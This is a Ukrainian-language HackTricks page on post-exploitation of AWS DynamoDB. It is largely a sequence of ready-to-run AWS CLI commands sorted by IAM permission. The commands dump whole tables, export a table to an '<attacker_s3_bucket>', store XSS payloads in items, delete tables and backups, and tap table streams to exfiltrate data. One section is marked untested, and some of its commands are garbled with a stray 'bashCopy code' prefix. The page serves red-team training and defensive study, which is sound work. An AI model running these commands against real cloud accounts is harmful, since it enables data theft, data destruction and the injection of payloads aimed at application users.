# AWS - DynamoDB Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## DynamoDB

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∑–º–æ–∂–µ **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –µ–ª–µ–º–µ–Ω—Ç–∏ –∑ —Ç–∞–±–ª–∏—Ü—å –∑–∞ –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º** (–≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –≤—Å—ñ –¥–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ –ø–µ—Ä–≤–∏–Ω–Ω—ñ –∫–ª—é—á—ñ (–≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü–µ, –æ—Ç—Ä–∏–º–∞–≤—à–∏ –º–µ—Ç–∞–¥–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ (`describe-table`).

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:GetItem`

**–°—Ö–æ–∂–µ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏** —Ü–µ–π –¥–æ–∑–≤–æ–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–º—É –∞—Ç–∞–∫—É—é—á–æ–º—É —á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ª–∏—à–µ –∑ 1 —Ç–∞–±–ª–∏—Ü—ñ, —è–∫—â–æ –≤—ñ–¥–æ–º–∏–π –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –∑–∞–ø–∏—Å—É, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

–ó —Ü—ñ—î—é –¥–æ–∑–≤–æ–ª–æ–º —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥ **`transact-get-items`** —Ç–∞–∫:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:Query`

**–°—Ö–æ–∂–µ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏** —Ü–µ–π –¥–æ–∑–≤–æ–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–º—É –∞—Ç–∞–∫—É—é—á–æ–º—É —á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ª–∏—à–µ –∑ 1 —Ç–∞–±–ª–∏—Ü—ñ, —è–∫—â–æ –≤—ñ–¥–æ–º–∏–π –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –∑–∞–ø–∏—Å—É, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏. –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [–ø—ñ–¥–º–Ω–æ–∂–∏–Ω—É –ø–æ—Ä—ñ–≤–Ω—è–Ω—å](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html), –∞–ª–µ —î–¥–∏–Ω–µ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è, —è–∫–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ –∑ –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º (—è–∫–µ –ø–æ–≤–∏–Ω–Ω–æ –∑'—è–≤–ª—è—Ç–∏—Å—è), —Ü–µ "EQ", —Ç–æ–º—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—é –ë–î –≤ –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ.

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:Scan`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –¥–æ–∑–≤—ñ–ª, —â–æ–± **–ª–µ–≥–∫–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤—Å—é —Ç–∞–±–ª–∏—Ü—é**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:PartiQLSelect`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –¥–æ–∑–≤—ñ–ª, —â–æ–± **–ª–µ–≥–∫–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤—Å—é —Ç–∞–±–ª–∏—Ü—é**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
–¶—è –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ `batch-execute-statement`, —è–∫:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
–∞–ª–µ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑–∞—Ç–∏ –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –∑ –∑–Ω–∞—á–µ–Ω–Ω—è–º, —Ç–æ–º—É —Ü–µ –Ω–µ —Ç–∞–∫ –∫–æ—Ä–∏—Å–Ω–æ.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

–¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –¥–æ–∑–≤–æ–ª–∏—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –≤—Å—é —Ç–∞–±–ª–∏—Ü—é –≤ S3 –±–∞–∫–µ—Ç** –Ω–∞ –π–æ–≥–æ –≤–∏–±—ñ—Ä:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ü—å–æ–≥–æ —Ç–∞–±–ª–∏—Ü—è –ø–æ–≤–∏–Ω–Ω–∞ –º–∞—Ç–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–µ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–∞ –º–æ–º–µ–Ω—Ç —á–∞—Å—É, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–∞—î —Ç–∞–±–ª–∏—Ü—è —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
–Ø–∫—â–æ —Ü–µ –Ω–µ —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ —Ü–µ**, —ñ –¥–ª—è —Ü—å–æ–≥–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

–ó —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É —Ç–∞–±–ª–∏—Ü—é –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –∫–æ–ø—ñ—ó** (–∞–±–æ –Ω–∞–≤—ñ—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω—É –∫–æ–ø—ñ—é, —â–æ–± –ø–æ—Ç—ñ–º –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—ó –≤ —ñ–Ω—à—ñ–π —Ç–∞–±–ª–∏—Ü—ñ). –ü–æ—Ç—ñ–º, –∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏, –≤—ñ–Ω –∑–º–æ–∂–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –∑ —Ä–µ–∑–µ—Ä–≤–Ω–∏—Ö –∫–æ–ø—ñ–π, —è–∫–∞ **–º–æ–∂–µ –±—ñ–ª—å—à–µ –Ω–µ –±—É—Ç–∏ –≤ –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω—ñ–π** —Ç–∞–±–ª–∏—Ü—ñ.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ä–µ–∑–µ—Ä–≤–Ω—ñ–π –∫–æ–ø—ñ—ó —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:PutItem`

–¶–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –¥–æ–¥–∞–≤–∞—Ç–∏ **–Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç –¥–æ —Ç–∞–±–ª–∏—Ü—ñ –∞–±–æ –∑–∞–º—ñ–Ω—é–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π –µ–ª–µ–º–µ–Ω—Ç** –Ω–æ–≤–∏–º –µ–ª–µ–º–µ–Ω—Ç–æ–º. –Ø–∫—â–æ –µ–ª–µ–º–µ–Ω—Ç –∑ —Ç–∞–∫–∏–º –∂–µ –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º –≤–∂–µ —ñ—Å–Ω—É—î, **–≤–µ—Å—å –µ–ª–µ–º–µ–Ω—Ç –±—É–¥–µ –∑–∞–º—ñ–Ω–µ–Ω–æ** –Ω–æ–≤–∏–º –µ–ª–µ–º–µ–Ω—Ç–æ–º. –Ø–∫—â–æ –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –Ω–µ —ñ—Å–Ω—É—î, –±—É–¥–µ **—Å—Ç–≤–æ—Ä–µ–Ω–æ** –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç –∑ –≤–∫–∞–∑–∞–Ω–∏–º –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º.

{% tabs %}
{% tab title="XSS Example" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="AI –ü—Ä–∏–∫–ª–∞–¥" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–æ–¥–∞–ª—å—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π/–æ–±—Ö—ñ–¥–Ω–∏—Ö —à–ª—è—Ö—ñ–≤ —à–ª—è—Ö–æ–º –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–¥–∞–≤–∞—Ç–∏/–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –≤ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB

### `dynamodb:UpdateItem`

–¶–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á—ñ –∞—Ç—Ä–∏–±—É—Ç–∏ –µ–ª–µ–º–µ–Ω—Ç–∞ –∞–±–æ –¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∞—Ç—Ä–∏–±—É—Ç–∏ –¥–æ –µ–ª–µ–º–µ–Ω—Ç–∞**. –í—ñ–Ω **–Ω–µ –∑–∞–º—ñ–Ω—é—î** –≤–µ—Å—å –µ–ª–µ–º–µ–Ω—Ç; –≤—ñ–Ω –ª–∏—à–µ –æ–Ω–æ–≤–ª—é—î –≤–∫–∞–∑–∞–Ω—ñ –∞—Ç—Ä–∏–±—É—Ç–∏. –Ø–∫—â–æ –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –Ω–µ —ñ—Å–Ω—É—î –≤ —Ç–∞–±–ª–∏—Ü—ñ, –æ–ø–µ—Ä–∞—Ü—ñ—è **—Å—Ç–≤–æ—Ä–∏—Ç—å –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç** –∑ –≤–∫–∞–∑–∞–Ω–∏–º –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º —ñ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç–∏, –≤–∫–∞–∑–∞–Ω—ñ –≤ –≤–∏—Ä–∞–∑—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è.

{% tabs %}
{% tab title="XSS Example" %}
{% code overflow="wrap" %}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="AI –ü—Ä–∏–∫–ª–∞–¥" %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–æ–¥–∞–ª—å—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π/–æ–±—Ö—ñ–¥–Ω–∏—Ö —à–ª—è—Ö—ñ–≤, –º–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏/–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –≤ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB

### `dynamodb:DeleteTable`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ **–≤–∏–¥–∞–ª–∏—Ç–∏ —Ç–∞–±–ª–∏—Ü—é DynamoDB, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—Ç—Ä–∞—Ç–∏ –¥–∞–Ω–∏—Ö**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –í—Ç—Ä–∞—Ç–∞ –¥–∞–Ω–∏—Ö —Ç–∞ –ø–æ—Ä—É—à–µ–Ω–Ω—è —Ä–æ–±–æ—Ç–∏ —Å–µ—Ä–≤—ñ—Å—ñ–≤, —â–æ –∑–∞–ª–µ–∂–∞—Ç—å –≤—ñ–¥ –≤–∏–¥–∞–ª–µ–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ.

### `dynamodb:DeleteBackup`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ **–≤–∏–¥–∞–ª–∏—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω—É –∫–æ–ø—ñ—é DynamoDB, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—Ç—Ä–∞—Ç–∏ –¥–∞–Ω–∏—Ö —É –≤–∏–ø–∞–¥–∫—É —Å—Ü–µ–Ω–∞—Ä—ñ—é –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ—Å–ª—è –∫–∞—Ç–∞—Å—Ç—Ä–æ—Ñ–∏**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –í—Ç—Ä–∞—Ç–∞ –¥–∞–Ω–∏—Ö —Ç–∞ –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –∫–æ–ø—ñ—ó –ø—ñ–¥ —á–∞—Å —Å—Ü–µ–Ω–∞—Ä—ñ—é –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ—Å–ª—è –∫–∞—Ç–∞—Å—Ç—Ä–æ—Ñ–∏.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Test if this actually works
{% endhint %}

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –ø–æ—Ç—ñ–∫ –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB, –æ–Ω–æ–≤–∏—Ç–∏ —Ç–∞–±–ª–∏—Ü—é, —â–æ–± –ø–æ—á–∞—Ç–∏ —Ç—Ä–∞–Ω—Å–ª—é–≤–∞—Ç–∏ –∑–º—ñ–Ω–∏, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ—Ç–æ–∫—É –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∑–º—ñ–Ω —É —Ç–∞–±–ª–∏—Ü—ñ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–∏ –¥–∞–Ω–∏—Ö, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤–∏—Ç–æ–∫—É –¥–∞–Ω–∏—Ö.

1. –£–≤—ñ–º–∫–Ω—ñ—Ç—å –ø–æ—Ç—ñ–∫ –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. –û–ø–∏—à—ñ—Ç—å –ø–æ—Ç—ñ–∫ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è ARN —Ç–∞ —ñ–Ω—à–∏—Ö –¥–µ—Ç–∞–ª–µ–π:
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ—Ç–µ—Ä–∞—Ç–æ—Ä —à–∞—Ä–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é ARN –ø–æ—Ç–æ–∫—É:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ—Ç–µ—Ä–∞—Ç–æ—Ä —à–∞—Ä–¥ –¥–ª—è –¥–æ—Å—Ç—É–ø—É —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö –∑ –ø–æ—Ç–æ–∫—É:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ —Ç–∞ –≤–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –ø—Ä–æ –∑–º—ñ–Ω–∏ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB.

{% hint style="success" %}
